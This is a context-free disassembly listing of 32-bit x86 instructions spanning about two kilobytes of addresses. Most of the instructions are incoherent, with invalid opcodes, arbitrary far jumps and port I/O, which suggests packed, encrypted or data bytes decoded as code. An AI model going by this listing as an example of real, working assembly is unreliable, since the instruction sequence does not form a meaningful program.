  40d780:	mov    al,ds:0xe9a48f36
  40d785:	loop   0x40d789
  40d787:	and    eax,0x3278646a
  40d78c:	add    DWORD PTR [ebx],ebp
  40d78e:	dec    esp
  40d78f:	jp     0x40d73f
  40d791:	and    DWORD PTR [ebx+0xb],edx
  40d794:	dec    esp
  40d795:	addr16 inc ebp
  40d797:	fcomp  QWORD PTR [edx-0x4b]
  40d79a:	xchg   cl,dh
  40d79c:	int    0xf0
  40d79e:	ficom  WORD PTR [edi-0x7]
  40d7a1:	cwde   
  40d7a2:	ret    0x78d6
  40d7a5:	bound  edi,QWORD PTR [eax+edi*8+0x642e4ffb]
  40d7ac:	mov    al,ds:0xd458973f
  40d7b1:	aas    
  40d7b2:	or     DWORD PTR ds:0x821c322c,0xffffffd5
  40d7b9:	into   
  40d7ba:	mov    eax,ds:0xf330fa8d
  40d7bf:	cmp    eax,0x50cfa9b2
  40d7c4:	add    eax,0xa6d5ae04
  40d7c9:	fadd   QWORD PTR [edx+ebx*1]
  40d7cc:	ficomp DWORD PTR [edi+edi*2]
  40d7cf:	pusha  
  40d7d0:	xor    dh,BYTE PTR [edi+0x45]
  40d7d3:	add    DWORD PTR [edi-0x19],ebp
  40d7d6:	out    0x29,al
  40d7d8:	test   DWORD PTR [edi+0x1d773537],0xc21c48ed
  40d7e2:	out    dx,al
  40d7e3:	dec    eax
  40d7e4:	jecxz  0x40d781
  40d7e6:	leave  
  40d7e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d7e8:	les    eax,FWORD PTR [edi+0x3]
  40d7eb:	mov    ds:0x4502357d,al
  40d7f0:	int    0x9
  40d7f2:	jmp    FWORD PTR [edx+0x313a22b6]
  40d7f8:	icebp  
  40d7f9:	or     al,BYTE PTR [ebx]
  40d7fb:	es jne 0x40d814
  40d7fe:	dec    esi
  40d7ff:	cli    
  40d800:	test   eax,0x3af552db
  40d805:	popa   
  40d806:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d807:	pop    edi
  40d808:	sbb    ah,dl
  40d80a:	jmp    0xf17c:0xf6dc6b41
  40d811:	xor    al,0x9f
  40d813:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d814:	push   0x212d718f
  40d819:	ficomp WORD PTR [esi-0x12340225]
  40d81f:	dec    ecx
  40d820:	push   esi
  40d821:	jno    0x40d7b5
  40d823:	adc    DWORD PTR [ecx+0x3b842b92],ecx
  40d829:	nop    ecx
  40d82c:	jmp    esi
  40d82e:	cld    
  40d82f:	inc    esi
  40d830:	xor    al,0xd4
  40d832:	(bad)  
  40d833:	lea    edi,[ebx]
  40d835:	in     al,0x75
  40d837:	pop    edx
  40d838:	push   ebp
  40d839:	stc    
  40d83a:	cli    
  40d83b:	pop    es
  40d83c:	in     al,dx
  40d83d:	inc    esp
  40d83e:	xor    eax,0x2eb46f36
  40d843:	push   eax
  40d844:	mov    WORD PTR [edx-0x49],fs
  40d847:	(bad)  
  40d848:	sbb    esp,esp
  40d84a:	xor    BYTE PTR [edx-0x45],ah
  40d84d:	adc    eax,0x39da1036
  40d852:	xchg   edi,eax
  40d853:	mov    edi,esi
  40d855:	push   cs
  40d856:	xchg   ecx,eax
  40d857:	xchg   esi,eax
  40d858:	xchg   BYTE PTR [esi],ah
  40d85a:	rcr    esp,cl
  40d85c:	jmp    0xd41286c3
  40d861:	mov    ebp,0x54de9d14
  40d866:	adc    bh,bh
  40d868:	loop   0x40d82d
  40d86a:	xor    edx,ebp
  40d86c:	les    ebp,FWORD PTR ds:[ebp-0x9]
  40d870:	sbb    BYTE PTR [ecx],dl
  40d872:	mov    bl,0x33
  40d874:	xchg   esi,eax
  40d875:	cmp    BYTE PTR [eax],dh
  40d877:	xchg   esi,eax
  40d878:	jmp    0xbfd80db8
  40d87d:	lds    eax,FWORD PTR [ecx+0x38]
  40d880:	stc    
  40d881:	pop    ecx
  40d882:	retf   0xfc4f
  40d885:	int    0x6d
  40d887:	(bad)  
  40d888:	sub    DWORD PTR [esi],edi
  40d88a:	and    ebp,DWORD PTR [ebx]
  40d88c:	gs or  esp,eax
  40d88f:	or     eax,0x294bb41e
  40d894:	icebp  
  40d895:	call   0x1bfa2cb4
  40d89a:	or     edx,esp
  40d89c:	in     al,0x47
  40d89e:	fld    QWORD PTR [eax]
  40d8a0:	jecxz  0x40d8dd
  40d8a2:	ss pop ecx
  40d8a4:	retf   0xb447
  40d8a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d8a8:	mov    ebp,0x5cd41946
  40d8ad:	mov    DWORD PTR [esi+0x44ba5b73],edi
  40d8b3:	sbb    edx,esp
  40d8b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d8b6:	push   edx
  40d8b7:	adc    bl,BYTE PTR [eax+0x3a]
  40d8ba:	adc    eax,0x21343e90
  40d8bf:	adc    bh,cl
  40d8c1:	adc    ebx,ebx
  40d8c3:	xchg   edx,eax
  40d8c4:	push   ebp
  40d8c5:	inc    esp
  40d8c6:	fwait
  40d8c7:	pavgb  mm5,QWORD PTR [edi+edi*2+0x630282cd]
  40d8cf:	inc    eax
  40d8d0:	cmc    
  40d8d1:	and    dl,bl
  40d8d3:	lock dec BYTE PTR ds:0x989e0924
  40d8da:	scas   al,BYTE PTR es:[edi]
  40d8db:	sub    BYTE PTR [ebx+0x24],0xfe
  40d8df:	push   edx
  40d8e0:	(bad)
  40d8e4:	push   ebp
  40d8e5:	int    0xa9
  40d8e7:	jp     0x40d891
  40d8e9:	das    
  40d8ea:	bound  ebx,QWORD PTR [edx-0x14142cab]
  40d8f0:	ret    
  40d8f1:	popf   
  40d8f2:	or     cl,BYTE PTR [edi+0x6be4921b]
  40d8f8:	cmp    BYTE PTR [esi],bh
  40d8fa:	sbb    ebp,DWORD PTR ds:0xbe3710e4
  40d900:	ins    DWORD PTR es:[edi],dx
  40d901:	test   eax,0x153b33a3
  40d906:	or     al,0xc2
  40d908:	ja     0x40d8a7
  40d90a:	pop    ecx
  40d90b:	sbb    ecx,DWORD PTR [esi-0x6551a7f2]
  40d911:	int    0x37
  40d913:	inc    ebx
  40d914:	inc    ebx
  40d915:	cmp    BYTE PTR [edi-0xe9f0748],0xf4
  40d91c:	test   al,0x18
  40d91e:	jae    0x40d901
  40d920:	pop    edi
  40d921:	(bad)  
  40d923:	xchg   ecx,eax
  40d924:	xor    cl,ch
  40d926:	ds mov ebx,0x7845f0c2
  40d92c:	in     eax,dx
  40d92d:	mov    al,ds:0x1137dae9
  40d932:	sti    
  40d933:	mov    cl,0xd1
  40d935:	fld    DWORD PTR [ebx-0x17]
  40d938:	cwde   
  40d939:	fstp   DWORD PTR [edx+0x6821c6e9]
  40d93f:	or     esp,ebx
  40d941:	pop    ds
  40d942:	inc    ebp
  40d943:	mov    ds:0x2d8e18a7,eax
  40d948:	add    BYTE PTR [edx],0x79
  40d94b:	mov    ecx,0xbe55830c
  40d950:	mov    dl,BYTE PTR [edx+0x1aee834f]
  40d956:	mov    ch,0xa
  40d958:	inc    ebp
  40d959:	mov    fs,WORD PTR [edi]
  40d95b:	mov    ebx,0x59413321
  40d960:	sub    BYTE PTR [edi+0x50],dl
  40d963:	std    
  40d964:	scas   al,BYTE PTR es:[edi]
  40d965:	pop    ebx
  40d966:	retf   0x3151
  40d969:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d96a:	(bad)  
  40d96b:	sbb    BYTE PTR [ebp+0x5a],al
  40d96e:	and    eax,0x36a2f8d0
  40d973:	mov    BYTE PTR [ecx+ebx*8+0x7b],cl
  40d977:	sbb    al,BYTE PTR ds:0x31d315e1
  40d97d:	das    
  40d97e:	test   DWORD PTR [ecx+0x14],esi
  40d981:	xor    al,0xc3
  40d983:	ret    0xca8c
  40d986:	out    dx,al
  40d987:	push   eax
  40d988:	cmp    esi,ebp
  40d98a:	and    BYTE PTR [esi],0x83
  40d98d:	inc    ecx
  40d98e:	lods   al,BYTE PTR ds:[esi]
  40d98f:	cld    
  40d990:	mov    dl,0xfc
  40d992:	js     0x40d931
  40d994:	popf   
  40d995:	dec    esp
  40d996:	jmp    0x40da0a
  40d998:	retf   0xa1a5
  40d99b:	xchg   edx,eax
  40d99c:	dec    esp
  40d99d:	int    0xb4
  40d99f:	or     BYTE PTR [ecx-0x48fc5b94],0x58
  40d9a6:	stos   BYTE PTR es:[edi],al
  40d9a7:	mov    dl,0x2a
  40d9a9:	mov    ebp,0x6077075c
  40d9ae:	and    eax,0xe1d0b5d4
  40d9b3:	leave  
  40d9b4:	pop    ecx
  40d9b5:	arpl   cx,sp
  40d9b7:	push   es
  40d9b8:	or     BYTE PTR [ebx-0x1dad8ffd],0xd3
  40d9bf:	bswap  edi
  40d9c1:	jmp    0xfadf:0x57172133
  40d9c8:	scas   ax,WORD PTR es:[edi]
  40d9ca:	pusha  
  40d9cb:	addr16 mov ebx,0xa7dc5fc8
  40d9d1:	xor    esi,ebx
  40d9d3:	dec    edx
  40d9d4:	jo     0x40d9a8
  40d9d6:	test   DWORD PTR [edi],edx
  40d9d8:	fimul  DWORD PTR [ecx+0x183d6ab1]
  40d9de:	or     BYTE PTR [eax+0x4258f4b4],cl
  40d9e4:	pop    eax
  40d9e5:	mov    al,0xec
  40d9e7:	or     esi,DWORD PTR [edi+0x1597236f]
  40d9ed:	retf   0xe6a6
  40d9f0:	cmp    esp,DWORD PTR [ebx-0x38]
  40d9f3:	cmp    BYTE PTR [esi-0x762fa572],dh
  40d9f9:	data16 fs or al,0xf0
  40d9fd:	xchg   ebx,eax
  40d9fe:	mov    ?,WORD PTR [edi+0x52]
  40da01:	add    eax,0x58997406
  40da06:	cmp    DWORD PTR [edx],0xffffffa3
  40da09:	in     eax,dx
  40da0a:	mov    eax,ds:0x53cd025e
  40da0f:	xchg   ecx,eax
  40da10:	adc    ebp,esp
  40da12:	sar    BYTE PTR [ebx],1
  40da14:	dec    esi
  40da15:	ds rol edx,cl
  40da18:	and    eax,0xee74f962
  40da1d:	cmp    al,0x8
  40da1f:	(bad)  
  40da20:	in     eax,dx
  40da21:	xchg   esi,edx
  40da23:	pop    es
  40da24:	out    dx,al
  40da25:	dec    ebp
  40da26:	sub    bl,dh
  40da28:	adc    al,0x22
  40da2a:	adc    BYTE PTR [edi+0x42],al
  40da2d:	jbe    0x40da88
  40da2f:	push   es
  40da30:	jl     0x40daa2
  40da32:	jbe    0x40da43
  40da34:	loop   0x40da07
  40da36:	add    bh,BYTE PTR [eiz*2+0x1782c0c9]
  40da3d:	lods   al,BYTE PTR ds:[esi]
  40da3e:	sbb    DWORD PTR cs:[eax+0x63],ebp
  40da42:	mov    bl,0x55
  40da44:	in     eax,0x83
  40da46:	imul   ebp,edi,0xeec6ebe1
  40da4c:	in     al,dx
  40da4d:	cwde   
  40da4e:	sbb    si,sp
  40da51:	ins    DWORD PTR es:[edi],dx
  40da52:	sbb    esp,DWORD PTR [esp+ecx*8+0x75]
  40da56:	push   cs
  40da57:	(bad)  
  40da58:	push   eax
  40da59:	sub    eax,0x52a6b62a
  40da5e:	xchg   ecx,eax
  40da5f:	sar    DWORD PTR [esi+0x36ba0e6b],1
  40da65:	jmp    0x71c0:0x7b6c17b6
  40da6c:	clc    
  40da6d:	cmp    DWORD PTR [esp+ecx*1],edx
  40da70:	pop    esp
  40da71:	inc    edi
  40da72:	sahf   
  40da73:	xchg   esi,eax
  40da74:	xlat   BYTE PTR ds:[ebx]
  40da75:	mov    cl,0xa3
  40da77:	xor    DWORD PTR [ebx-0x70],0xde0fdd39
  40da7e:	dec    eax
  40da7f:	push   esp
  40da80:	mov    edx,0x332d2349
  40da85:	paddsb mm0,QWORD PTR [ebx]
  40da88:	test   al,0xd7
  40da8a:	mov    bl,0xa6
  40da8c:	cld    
  40da8d:	mov    al,0xf4
  40da8f:	sar    BYTE PTR [edx],1
  40da91:	popf   
  40da92:	jmp    0x2501:0x69850fa1
  40da99:	push   0x85d8f0a0
  40da9e:	jge    0x40da68
  40daa0:	and    al,0x6a
  40daa2:	inc    ebp
  40daa3:	fisubr DWORD PTR [edi]
  40daa5:	rcr    BYTE PTR [edx],0x3b
  40daa8:	or     dl,BYTE PTR [eax-0x2a]
  40daab:	shl    BYTE PTR [eax-0x1b616a7b],cl
  40dab1:	es push ebp
  40dab3:	xor    ch,BYTE PTR [ebx-0xa63f7e5]
  40dab9:	pushf  
  40daba:	add    BYTE PTR [edi],0x1a
  40dabd:	or     al,0xbb
  40dabf:	lods   al,BYTE PTR ds:[esi]
  40dac0:	inc    eax
  40dac1:	mov    ecx,0xf96f090
  40dac6:	lahf   
  40dac7:	ins    BYTE PTR es:[edi],dx
  40dac8:	xor    DWORD PTR [ebx+0x4f011a24],esp
  40dace:	sbb    eax,0x57ea93e8
  40dad3:	je     0x40da7a
  40dad5:	test   BYTE PTR [esi],bh
  40dad7:	adc    ecx,DWORD PTR [eax]
  40dad9:	xchg   edx,eax
  40dada:	and    eax,0x62c2354
  40dadf:	(bad)  
  40dae0:	jg     0x40da94
  40dae2:	stc    
  40dae3:	xor    esp,DWORD PTR [ecx+ebx*8-0x6eb4368d]
  40daea:	sub    edx,DWORD PTR [eax+0x619191b2]
  40daf0:	in     al,0x27
  40daf2:	repz jl 0x40db57
  40daf5:	hlt    
  40daf6:	add    al,0x40
  40daf8:	data16 fstp DWORD PTR [edi]
  40dafb:	(bad)  
  40dafc:	dec    esi
  40dafd:	xor    al,0x73
  40daff:	adc    al,0x3a
  40db01:	add    BYTE PTR [ebp-0x11614a50],al
  40db07:	push   esp
  40db08:	mov    dh,cl
  40db0a:	sahf   
  40db0b:	xchg   edx,eax
  40db0c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40db0d:	icebp  
  40db0e:	add    DWORD PTR [esi+0x44eb31ac],edi
  40db14:	fst    QWORD PTR [esi]
  40db16:	scas   al,BYTE PTR es:[edi]
  40db17:	mov    cl,0xce
  40db1a:	cwde   
  40db1b:	jmp    0xdd9ab948
  40db20:	jecxz  0x40daf6
  40db22:	xor    eax,DWORD PTR [edx+0x62]
  40db25:	mov    esp,es
  40db27:	xchg   esi,eax
  40db28:	cli    
  40db29:	jbe    0x40db9b
  40db2b:	and    al,0x13
  40db2d:	pusha  
  40db2e:	nop
  40db2f:	dec    edi
  40db30:	mov    ebx,0x79cb5690
  40db35:	adc    DWORD PTR [edx-0x7eac219],0xffffffe2
  40db3c:	fwait
  40db3d:	mov    esp,0xc5595f42
  40db42:	push   ebp
  40db43:	lea    ecx,[esi-0x18]
  40db46:	test   al,0xf5
  40db48:	add    DWORD PTR [ecx-0x30224d2c],esi
  40db4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40db4f:	test   eax,0x5d410911
  40db54:	jp     0x40db51
  40db56:	sub    DWORD PTR [ecx],edx
  40db58:	pop    esp
  40db59:	imul   ebp,esi,0x67c87a9d
  40db5f:	aad    0x5
  40db61:	push   cs
  40db62:	jb     0x40db60
  40db64:	sbb    DWORD PTR [ebp-0x30860bb5],0xfffffffb
  40db6b:	out    0x19,al
  40db6d:	add    DWORD PTR [ebp-0x7e],ecx
  40db70:	push   eax
  40db71:	aas    
  40db72:	cmp    al,0xdd
  40db74:	ins    DWORD PTR es:[edi],dx
  40db75:	mov    edx,0x74f28997
  40db7a:	add    eax,0xaa82b5be
  40db7f:	int3   
  40db80:	out    0x2c,al
  40db82:	push   cs
  40db83:	fmul   st,st(4)
  40db85:	fld    DWORD PTR [ecx+0x115b5aca]
  40db8b:	jecxz  0x40db35
  40db8d:	stc    
  40db8e:	adc    al,0xa7
  40db90:	(bad)  [ecx+0x2320855a]
  40db96:	xlat   BYTE PTR ds:[ebx]
  40db97:	fisub  DWORD PTR [eax]
  40db99:	push   es
  40db9a:	dec    ebp
  40db9b:	das    
  40db9c:	(bad)  
  40db9d:	into   
  40db9e:	pop    eax
  40db9f:	lds    esp,FWORD PTR [edx-0x3d94afc5]
  40dba5:	aam    0x63
  40dba7:	jle    0x40db76
  40dba9:	dec    esi
  40dbaa:	imul   esi,DWORD PTR [ebx-0x75],0x370c5fbb
  40dbb1:	enter  0x8b19,0xd4
  40dbb5:	adc    esi,DWORD PTR [ebx+0x50]
  40dbb8:	je     0x40dc2c
  40dbba:	out    0x62,al
  40dbbc:	out    dx,eax
  40dbbd:	dec    edi
  40dbbe:	adc    BYTE PTR [eax],al
  40dbc0:	inc    esp
  40dbc1:	repz int3 
  40dbc3:	mov    al,0x8d
  40dbc5:	daa    
  40dbc6:	jp     0x40dbd6
  40dbc8:	sbb    DWORD PTR [edx+0x1289036d],edi
  40dbce:	clc    
  40dbcf:	dec    esi
  40dbd0:	out    dx,eax
  40dbd1:	jne    0x40dc2d
  40dbd3:	ror    cl,1
  40dbd5:	pop    esi
  40dbd6:	popa   
  40dbd7:	pusha  
  40dbd8:	je     0x40dbaf
  40dbda:	adc    al,BYTE PTR [ebx+0x6f]
  40dbdd:	scas   eax,DWORD PTR es:[edi]
  40dbde:	push   ds
  40dbdf:	mov    bh,0x7
  40dbe1:	push   ss
  40dbe2:	mov    ebx,0xfa394182
  40dbe7:	mov    ch,0x13
  40dbe9:	mov    eax,0xfde11345
  40dbee:	pop    ebp
  40dbef:	mov    edi,ebp
  40dbf1:	in     eax,0x9
  40dbf3:	mov    al,ds:0xe7e36939
  40dbf8:	aas    
  40dbf9:	xchg   ecx,eax
  40dbfa:	aaa    
  40dbfb:	fcmovu st,st(0)
  40dbfd:	not    dh
  40dbff:	xchg   esi,eax
  40dc00:	outs   dx,DWORD PTR ds:[esi]
  40dc01:	shl    BYTE PTR [edx-0x1c],1
  40dc04:	cmp    BYTE PTR [eax-0x5b4d42d3],dl
  40dc0a:	add    ah,bh
  40dc0c:	idiv   ebx
  40dc0e:	les    ebx,FWORD PTR [ebp-0x424ee178]
  40dc14:	push   cs
  40dc15:	int    0x46
  40dc17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dc18:	test   eax,0xcf263359
  40dc1d:	popf   
  40dc1e:	loope  0x40dbef
  40dc20:	mov    ebp,DWORD PTR [esi-0x56418b94]
  40dc26:	mov    WORD PTR ds:0x60f1d794,cs
  40dc2c:	in     eax,0xc3
  40dc2e:	(bad)  
  40dc2f:	out    dx,al
  40dc30:	xchg   ebx,eax
  40dc31:	in     eax,dx
  40dc32:	or     eax,0xf0a5dec3
  40dc37:	pop    edi
  40dc38:	gs and ah,cl
  40dc3b:	dec    ecx
  40dc3c:	lds    esi,FWORD PTR [ecx-0x42]
  40dc3f:	shr    BYTE PTR [edx-0x79],0x16
  40dc43:	out    0xbf,al
  40dc45:	cs sahf 
  40dc47:	jl     0x40dc7e
  40dc49:	(bad)  
  40dc4a:	jo     0x40dcb7
  40dc4c:	ja     0x40dccd
  40dc4e:	pop    ss
  40dc4f:	xchg   DWORD PTR [eax+0x577f8812],ebx
  40dc55:	inc    esp
  40dc56:	mov    ebx,0x7649600b
  40dc5b:	sahf   
  40dc5c:	and    al,0x3e
  40dc5e:	iret   
  40dc5f:	and    al,0x7c
  40dc61:	xor    edi,DWORD PTR [eax+ebp*1+0x5c7bd2f7]
  40dc68:	ins    BYTE PTR es:[edi],dx
  40dc69:	dec    edx
  40dc6a:	inc    ebp
  40dc6b:	jg     0x40dc39
  40dc6d:	sbb    al,0x89
  40dc6f:	jg     0x40dcad
  40dc71:	sar    DWORD PTR [ebx],1
  40dc73:	es (bad) 
  40dc75:	loop   0x40dc29
  40dc77:	clc    
  40dc78:	xchg   ecx,eax
  40dc79:	in     eax,dx
  40dc7a:	jae    0x40dce5
  40dc7c:	fcmovnu st,st(7)
  40dc7e:	fimul  WORD PTR [ecx]
  40dc80:	mov    ebx,0xfb7193da
  40dc85:	out    dx,al
  40dc86:	jns    0x40dc52
  40dc88:	fisub  DWORD PTR [eax-0x2c]
  40dc8b:	jmp    0x4314:0x81defabd
  40dc92:	mov    ah,0x2e
  40dc94:	daa    
  40dc95:	xchg   esp,eax
  40dc96:	or     DWORD PTR [ecx-0x2ca39a77],0x1d
  40dc9d:	pusha  
  40dc9e:	add    DWORD PTR [edx-0x5c],edi
  40dca1:	daa    
  40dca2:	inc    eax
  40dca3:	sti    
  40dca4:	or     DWORD PTR [esi+0x2e],0xe9b9e81a
  40dcab:	bound  eax,QWORD PTR [edi+0x2bea507e]
  40dcb1:	and    esi,0xffffff8e
  40dcb4:	cdq    
  40dcb5:	(bad)  
  40dcb6:	pop    ebp
  40dcb7:	xor    eax,0x393e7b18
  40dcbc:	sub    BYTE PTR [ebx],dl
  40dcbe:	pushf  
  40dcbf:	aaa    
  40dcc0:	fisttp QWORD PTR [ebp+0x4edb4013]
  40dcc6:	pop    ebp
  40dcc7:	cmp    BYTE PTR [edi],bl
  40dcc9:	mov    DWORD PTR [esi],esi
  40dccb:	sti    
  40dccc:	xchg   esp,eax
  40dccd:	int    0xfe
  40dccf:	push   0xe6f9105a
  40dcd4:	fmulp  st(0),st
  40dcd6:	mov    cs,WORD PTR [ecx]
  40dcd8:	(bad)  
  40dcd9:	adc    al,BYTE PTR [edi-0x249b169c]
  40dcdf:	sub    al,0xa
  40dce1:	or     BYTE PTR [ebx],dh
  40dce3:	xor    ecx,ebx
  40dce5:	nop
  40dce6:	sbb    BYTE PTR [ecx-0x14816ac2],ah
  40dcec:	nop
  40dced:	out    dx,eax
  40dcee:	push   ebx
  40dcef:	sbb    BYTE PTR [ecx+0x20e00286],bl
  40dcf5:	mov    esi,0x16351e95
  40dcfa:	add    al,0x6c
  40dcfc:	inc    eax
  40dcfd:	sub    esi,DWORD PTR [ebp-0x58]
  40dd00:	xor    DWORD PTR [eax],0xfffffffb
  40dd03:	out    0xac,al
  40dd05:	stc    
  40dd06:	daa    
  40dd07:	cld    
  40dd08:	sti    
  40dd09:	iret   
  40dd0a:	or     DWORD PTR [esi-0x7b],esi
  40dd0d:	jb     0x40dd81
  40dd0f:	shr    BYTE PTR ds:0x9f9c6dfa,cl
  40dd15:	ins    DWORD PTR es:[edi],dx
  40dd16:	int    0xfc
  40dd18:	or     DWORD PTR [ebx],esp
  40dd1a:	mov    bh,0x1e
  40dd1c:	es mov al,0x6e
  40dd1f:	and    al,0xf4
  40dd21:	cmp    DWORD PTR [esi],0x92513fe2
  40dd27:	push   ecx
  40dd28:	pop    edi
  40dd29:	mov    al,0xb9
  40dd2b:	push   edi
  40dd2c:	sidtd  [eax+0x483bcda0]
  40dd33:	lahf   
  40dd34:	in     eax,dx
  40dd35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dd36:	mov    BYTE PTR [ebx-0x2f],bl
  40dd39:	xor    DWORD PTR ss:[esi+0x4c],edx
  40dd3d:	cmp    BYTE PTR [ebx+edx*8],dh
  40dd40:	mov    bh,0xd3
  40dd42:	inc    esi
  40dd43:	repnz inc esp
  40dd45:	mov    esp,0x5614e99f
  40dd4a:	and    dl,BYTE PTR [esi+0x31]
  40dd4d:	sbb    ecx,DWORD PTR [eax]
  40dd4f:	mov    ah,0x71
  40dd51:	outs   dx,BYTE PTR es:[esi]
  40dd53:	enter  0x6d54,0x7c
  40dd57:	push   cs
  40dd58:	cmp    ebp,esp
  40dd5a:	popa   
  40dd5b:	or     dh,BYTE PTR [ebx+0x78]
  40dd5e:	mov    edi,0x84261e5c
  40dd63:	cdq    
  40dd64:	xor    al,0x36
  40dd66:	xor    al,0x94
  40dd68:	inc    ebx
  40dd69:	xor    BYTE PTR [edx],ch
  40dd6b:	add    DWORD PTR [edx+0x68702cd7],ecx
  40dd71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dd72:	lahf   
  40dd73:	fiadd  WORD PTR [ebx-0x67b1f64c]
  40dd79:	retf   0xa76d
  40dd7c:	sub    DWORD PTR [edx+eiz*1-0x32f3c2cb],eax
  40dd83:	inc    edx
  40dd84:	test   DWORD PTR [eax],edx
  40dd86:	pop    esi
  40dd87:	fcom   QWORD PTR [eax+0x66b065c1]
  40dd8d:	arpl   WORD PTR [esi+0x65],si
  40dd90:	ss (bad) 
  40dd92:	fcom   QWORD PTR [ecx+0x115aba63]
  40dd98:	adc    edx,DWORD PTR [esi]
  40dd9a:	pop    ebp
  40dd9b:	outs   dx,BYTE PTR ds:[esi]
  40dd9c:	cmc    
  40dd9d:	js     0x40de0b
  40dd9f:	pop    ebp
  40dda0:	cmp    DWORD PTR [eax],esp
  40dda2:	mov    al,ds:0x49cb2b7f
  40dda7:	pop    eax
  40dda8:	mov    esp,0xf8be100e
  40ddad:	lds    ecx,FWORD PTR [ecx-0xa01b9d7]
  40ddb3:	cmc    
  40ddb4:	mov    ebp,0xc0e9c22d
  40ddb9:	clc    
  40ddba:	jae    0x40dda1
  40ddbc:	aad    0xb9
  40ddbe:	and    edi,DWORD PTR [ebx+0x5]
  40ddc1:	leave  
  40ddc2:	(bad)  
  40ddc3:	repz les ebx,FWORD PTR [eax+0x46a7cec1]
  40ddca:	das    
  40ddcb:	pusha  
  40ddcc:	bound  edx,QWORD PTR [edi-0x70]
  40ddcf:	test   eax,0x1bb6bea4
  40ddd4:	mov    ah,0xe5
  40ddd6:	stc    
  40ddd7:	jb     0x40ddaa
  40ddd9:	bound  edi,QWORD PTR [ebx]
  40dddb:	leave  
  40dddc:	pop    ebx
  40dddd:	adc    bh,al
  40dddf:	sub    eax,0xf43d7c02
  40dde4:	mov    cl,0x27
  40dde6:	rcr    esi,cl
  40dde8:	mov    ds:0x8fa20f3a,eax
  40dded:	push   ecx
  40ddee:	int3   
  40ddef:	jge    0x40de13
  40ddf1:	inc    ebx
  40ddf2:	sub    eax,eax
  40ddf4:	and    ebx,0x2b4acf8b
  40ddfa:	adc    eax,0x89715032
  40ddff:	jge    0x40ddfa
  40de01:	sub    bh,bl
  40de03:	push   0xa
  40de05:	pusha  
  40de06:	xchg   esp,eax
  40de07:	fsubp  st(1),st
  40de09:	pop    ds
  40de0a:	mov    bh,0xd3
  40de0c:	push   0xecba82f5
  40de11:	dec    bx
  40de13:	js     0x40de42
  40de15:	push   eax
  40de16:	scas   al,BYTE PTR es:[edi]
  40de17:	enter  0xc38c,0xcf
  40de1b:	sbb    DWORD PTR [ecx+ebx*4-0x4a6e31bc],edx
  40de22:	ja     0x40de55
  40de24:	mov    bl,0x51
  40de26:	mov    edx,DWORD PTR [ebx-0x7d4a04f5]
  40de2c:	loope  0x40ddb9
  40de2e:	sub    al,0xf7
  40de30:	imul   esp,DWORD PTR [ebp-0x34],0xe0f6edc3
  40de37:	loopne 0x40de40
  40de39:	arpl   WORD PTR [ebp+ecx*8-0x7624374f],ax
  40de40:	sbb    eax,0xbf594c18
  40de45:	mov    DWORD PTR [eax],edx
  40de47:	pop    esi
  40de48:	iret   
  40de49:	mov    ch,0x19
  40de4b:	popa   
  40de4c:	enter  0x1287,0xd9
  40de50:	xchg   ebp,ebp
  40de52:	retf   
  40de53:	outs   dx,DWORD PTR ds:[esi]
  40de54:	jle    0x40dde3
  40de56:	mov    dl,0x22
  40de58:	cmc    
  40de59:	add    DWORD PTR [esi-0x3b],0x8
  40de5d:	lock lods al,BYTE PTR ds:[esi]
  40de5f:	ficom  DWORD PTR [ebp+0x66]
  40de62:	inc    edi
  40de63:	pop    esi
  40de64:	jmp    0xe94ea6d9
  40de69:	call   0x6311:0x57dc64ef
  40de70:	jno    0x40de4a
  40de72:	mov    al,0x9e
  40de74:	test   BYTE PTR [ebp-0x2908135f],ch
  40de7a:	sbb    ch,BYTE PTR [eax+edx*8+0xe03db94]
  40de81:	lock sar BYTE PTR [edi+0x6a6489ef],0x11
  40de89:	inc    edx
  40de8a:	out    dx,al
  40de8b:	clc    
  40de8c:	call   0x9699a64e
  40de91:	lahf   
  40de92:	retf   0x9cc4
  40de95:	jmp    0xc643:0xc2e6babf
  40de9c:	in     al,dx
  40de9d:	outs   dx,DWORD PTR ds:[esi]
  40de9e:	call   0x655443f6
  40dea3:	cmp    eax,0x1bf60bc0
  40dea8:	push   ebx
  40dea9:	jno    0x7141b8ef
  40deaf:	mov    cl,0xaa
  40deb1:	ret    
  40deb2:	jns    0x40de97
  40deb4:	jecxz  0x40deff
  40deb6:	rcr    DWORD PTR [ebx-0xf],0x15
  40deba:	ret    
  40debb:	sbb    esi,DWORD PTR es:[ecx+0x26]
  40debf:	in     eax,0xb0
  40dec1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dec2:	mov    ecx,0x1686c66d
  40dec7:	daa    
  40dec8:	int    0x1a
  40deca:	xchg   esp,eax
  40decb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40decc:	nop
  40decd:	and    cl,ch
  40decf:	shr    BYTE PTR [eax],0xfd
  40ded2:	lods   al,BYTE PTR ds:[esi]
  40ded3:	aad    0xc3
  40ded5:	test   BYTE PTR [ecx+0x6b50eed3],al
  40dedb:	icebp  
  40dedc:	mov    WORD PTR [edx+0x7b],ss
  40dedf:	ja     0x40dec8
  40dee1:	jl     0x40df02
  40dee3:	dec    esp
  40dee4:	repz jne 0x40de70
  40dee7:	cmp    al,0xe4
  40dee9:	aad    0x5d
  40deeb:	int3   
  40deec:	jns    0x40df50
  40deee:	bound  esp,QWORD PTR [ebx+0x4fc298b4]
  40def4:	test   DWORD PTR [ecx-0x2e],0xc6735069
  40defb:	(bad)  
  40defd:	(bad)  
  40defe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40deff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40df00:	ins    DWORD PTR es:[edi],dx
  40df01:	dec    edx
  40df02:	lods   eax,DWORD PTR ds:[esi]
  40df03:	pavgb  mm5,QWORD PTR [ebp+0x54]
  40df07:	test   eax,0xe948528b
